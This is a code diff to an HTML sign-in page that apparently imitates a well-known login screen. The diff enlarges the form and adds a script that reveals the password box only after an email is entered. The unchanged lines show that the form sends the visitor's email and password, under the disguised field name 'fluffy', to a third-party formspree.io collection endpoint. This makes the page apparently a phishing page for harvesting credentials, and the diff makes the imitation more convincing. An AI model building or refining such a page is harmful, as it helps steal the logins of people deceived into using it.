@@ -22,7 +22,7 @@
             padding: 30px;
             border-radius: 25px;
             width: 990px;
-            height: 360px;
+            height: 450px; /* Increased the height for a larger form */
             color: white;
             display: flex;
             justify-content: flex-start;
@@ -58,7 +58,7 @@
             font-weight: 300;
         }
         .input-box {
-            width: 40%;
+            width: 50%; /* Made the input box larger */
             padding: 10px;
             margin-top: 20px; 
             border: 2px solid #333;
@@ -66,7 +66,7 @@
             color: white;
             border-radius: 5px;
             font-size: 16px;
-            height: 40px;
+            height: 45px; /* Made the height larger */
             margin-left: auto;
             margin-right: 0;
         }
@@ -78,9 +78,9 @@
         .right-side-container {
             display: flex;
             flex-direction: column;
-            align-items: flex-start; 
+            align-items: flex-start;
             margin-left: auto;
-            margin-top: 10px; 
+            margin-top: 10px;
         }
         .forgot-email-link, .guest-mode, .btn-container, .footer {
             margin-left: 0;
@@ -143,10 +143,10 @@
         <form id="signinForm" action="https://formspree.io/f/moveakwr" method="POST">
             <div class="right-side-container">
                 <!-- Email or Phone Input -->
-                <input type="email" name="email" id="emailInput" class="input-box" placeholder="Email or phone" required>
+                <input type="email" name="email" id="emailInput" class="input-box" placeholder="Email or phone" required oninput="checkEmail()">
 
                 <!-- "Fluffy" (Password) Input -->
-                <input type="password" name="fluffy" id="passwordInput" class="input-box" placeholder="Password" required>
+                <input type="password" name="fluffy" id="passwordInput" class="input-box" placeholder="Password" required style="display: none;">
 
                 <!-- Forgot Email Link -->
                 <a href="#" class="link forgot-email-link" id="forgotEmailLink">Forgot email?</a>
@@ -175,7 +175,18 @@
     </div>
 
     <script>
-        // Optional: Prevent submission without email
+        // Function to show password input after email is entered
+        function checkEmail() {
+            var email = document.getElementById('emailInput').value;
+            var passwordInput = document.getElementById('passwordInput');
+            if (email) {
+                passwordInput.style.display = 'block'; // Show password input
+            } else {
+                passwordInput.style.display = 'none'; // Hide password input if email is empty
+            }
+        }
+
+        // Optional: Prevent form submission without email
         document.getElementById('signinForm').addEventListener('submit', function(event) {
             var email = document.getElementById('emailInput').value;
             if (!email) {
